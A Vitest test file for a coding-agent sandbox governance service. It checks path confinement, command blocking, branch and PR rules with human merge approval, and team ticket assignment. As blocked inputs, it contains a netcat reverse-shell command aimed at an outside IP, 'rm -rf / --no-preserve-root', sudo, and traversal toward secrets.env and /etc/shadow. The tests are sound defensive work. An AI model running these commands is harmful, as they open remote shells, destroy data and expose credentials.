import { describe, it, expect } from "vitest";
import path from "node:path";
import {
  codingAgentGovernanceService,
  SandboxPolicyViolationError,
  type SandboxPolicyConfig,
} from "./coding-agent-governance.js";
import {
  governanceTeamAssignmentService,
  DEFAULT_TEAM_MEMBERS,
} from "./governance-team-assignment.js";

describe("Coding Agent Sandbox Governance & PR Merge Policy", () => {
  const workspaceDir = path.resolve(process.cwd(), "workspaces", "project-auro");
  const policy: SandboxPolicyConfig = {
    filesystemScope: "workspace",
    networkScope: "isolated",
    workspaceDir,
  };

  it("permits file access inside the workspace directory", () => {
    const validFile = path.join(workspaceDir, "src", "index.ts");
    const result = codingAgentGovernanceService.validatePathAccess(validFile, policy);
    expect(result.allowed).toBe(true);
    expect(result.normalizedPath).toBe(path.resolve(validFile));
  });

  it("blocks out-of-policy workspace path traversal", () => {
    const outsideFile = path.join(workspaceDir, "..", "..", "secrets.env");
    expect(() => {
      codingAgentGovernanceService.validatePathAccess(outsideFile, policy);
    }).toThrowError(SandboxPolicyViolationError);

    try {
      codingAgentGovernanceService.validatePathAccess(outsideFile, policy);
    } catch (err: any) {
      expect(err.code).toMatch(/SANDBOX_(WORKSPACE_CONFINEMENT_VIOLATION|PATH_TRAVERSAL_BLOCKED)/);
    }
  });

  it("blocks sensitive system path traversal (/etc/passwd, C:\\Windows)", () => {
    const etcPasswd = process.platform === "win32" ? "C:\\Windows\\System32\\config" : "/etc/shadow";
    expect(() => {
      codingAgentGovernanceService.validatePathAccess(etcPasswd, policy);
    }).toThrowError(SandboxPolicyViolationError);
  });

  it("blocks dangerous shell commands (sudo, rm -rf /, reverse shells)", () => {
    expect(() => {
      codingAgentGovernanceService.validateCommandExecution("sudo apt-get install", policy);
    }).toThrowError(SandboxPolicyViolationError);

    expect(() => {
      codingAgentGovernanceService.validateCommandExecution("rm -rf / --no-preserve-root", policy);
    }).toThrowError(SandboxPolicyViolationError);

    expect(() => {
      codingAgentGovernanceService.validateCommandExecution("nc -e /bin/sh 10.0.0.1 4444", policy);
    }).toThrowError(SandboxPolicyViolationError);
  });

  it("permits standard benign development commands", () => {
    expect(codingAgentGovernanceService.validateCommandExecution("pnpm test", policy).allowed).toBe(true);
    expect(codingAgentGovernanceService.validateCommandExecution("git status", policy).allowed).toBe(true);
    expect(codingAgentGovernanceService.validateCommandExecution("tsc --noEmit", policy).allowed).toBe(true);
  });

  it("blocks direct commits to main or master branches", () => {
    expect(() => {
      codingAgentGovernanceService.submitBranchCommit({
        branchName: "main",
        commitMessage: "Direct commit to production",
        filesChanged: ["src/index.ts"],
        prDescription: {
          thinkingPath: "Bypassing branch rules",
          whatChanged: ["All files"],
          verification: "Untested",
          risks: "High",
          modelUsed: "opencode/deepseek-v4-pro",
        },
      });
    }).toThrowError(SandboxPolicyViolationError);
  });

  it("rejects incomplete PR descriptions", () => {
    expect(() => {
      codingAgentGovernanceService.submitBranchCommit({
        branchName: "feat/document-center",
        commitMessage: "Add document center",
        filesChanged: ["ui/src/components/DocumentCenter.tsx"],
        prDescription: {
          thinkingPath: "", // Missing
          whatChanged: [], // Empty
          verification: "",
          risks: "",
          modelUsed: "",
        },
      });
    }).toThrowError(SandboxPolicyViolationError);
  });

  it("permits valid feature branch commit with complete PR description", () => {
    const result = codingAgentGovernanceService.submitBranchCommit({
      branchName: "feat/document-center-ui",
      commitMessage: "feat: add Document Center and multi-format exporters",
      filesChanged: ["ui/src/components/DocumentCenter.tsx", "server/src/routes/governance.ts"],
      prDescription: {
        thinkingPath: "Need unified UI for viewing 12 governance documents, version diffs, and triggering exports.",
        whatChanged: ["Added DocumentCenter component", "Mounted export REST endpoints"],
        verification: "Tested with Vitest and Supertest; 100% test pass.",
        risks: "None; non-breaking additive routes.",
        modelUsed: "opencode/deepseek-v4-pro",
      },
    });

    expect(result.success).toBe(true);
    expect(result.branchName).toBe("feat/document-center-ui");
    expect(result.prUrl).toContain("feat/document-center-ui");
  });

  it("blocks PR merge to main when human approval is missing", () => {
    expect(() => {
      codingAgentGovernanceService.mergePullRequest({
        branchName: "feat/document-center-ui",
        targetBranch: "main",
        approvedByHuman: false,
      });
    }).toThrowError(SandboxPolicyViolationError);
  });

  it("allows PR merge to main when human board approval is provided", () => {
    const result = codingAgentGovernanceService.mergePullRequest({
      branchName: "feat/document-center-ui",
      targetBranch: "main",
      approvedByHuman: true,
      approverUserId: "human-lead-user-1",
    });

    expect(result.merged).toBe(true);
    expect(result.message).toContain("human-lead-user-1");
  });
});

describe("Human Team Assignment & Capacity Tracking Service", () => {
  const companyId = "company-team-test-1";

  it("initializes default team roster and assigns initial sprint tickets", () => {
    const state = governanceTeamAssignmentService.getState(companyId);
    expect(state.members.length).toBe(DEFAULT_TEAM_MEMBERS.length);
    expect(state.tickets.length).toBeGreaterThanOrEqual(5);

    const alice = state.members.find((m) => m.name === "Alice Morgan");
    expect(alice).toBeDefined();
    expect(alice?.weeklyCapacityHours).toBe(40);
  });

  it("converts sprint stories to assignable tickets", () => {
    const state = governanceTeamAssignmentService.convertSprintToTickets(companyId);
    expect(state.tickets.length).toBeGreaterThan(0);
    for (const t of state.tickets) {
      expect(t.id.startsWith("TICK-")).toBe(true);
      expect(t.status).toBe("backlog");
      expect(t.estimatedHours).toBeGreaterThan(0);
    }
  });

  it("reassigns tickets to human members and updates status & capacity", () => {
    const state = governanceTeamAssignmentService.getState(companyId);
    const firstTicket = state.tickets[0];
    const bob = state.members.find((m) => m.name === "Bob Chen");

    const updated = governanceTeamAssignmentService.assignTicket(companyId, firstTicket.id, {
      assigneeMemberId: bob?.id,
      status: "in_progress",
    });

    expect(updated.assigneeMemberId).toBe(bob?.id);
    expect(updated.assigneeName).toBe("Bob Chen");
    expect(updated.status).toBe("in_progress");

    const refreshedState = governanceTeamAssignmentService.getState(companyId);
    const refreshedBob = refreshedState.members.find((m) => m.name === "Bob Chen");
    expect(refreshedBob?.assignedHours).toBeGreaterThan(0);
  });

  it("exports formatted team assignment sheet as CSV", () => {
    const csv = governanceTeamAssignmentService.exportAssignmentSheetCsv(companyId);
    expect(csv).toContain("Ticket ID,Story ID,Summary,Epic,Assignee,Status,Story Points,Estimated Hours,Required Skills");
    expect(csv).toContain("Bob Chen");
    expect(csv).toContain("TICK-101");
  });
});
